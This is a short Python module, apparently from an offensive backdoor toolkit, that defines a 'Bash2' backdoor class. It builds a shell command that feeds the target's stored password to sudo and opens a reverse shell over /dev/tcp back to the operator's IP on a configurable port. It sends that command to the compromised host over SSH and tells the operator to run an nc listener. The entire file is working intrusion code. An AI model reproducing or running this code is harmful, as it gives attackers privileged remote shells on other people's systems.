from backdoor import *

class Bash2(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using second Bash module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {} 
    
    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
    
    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())
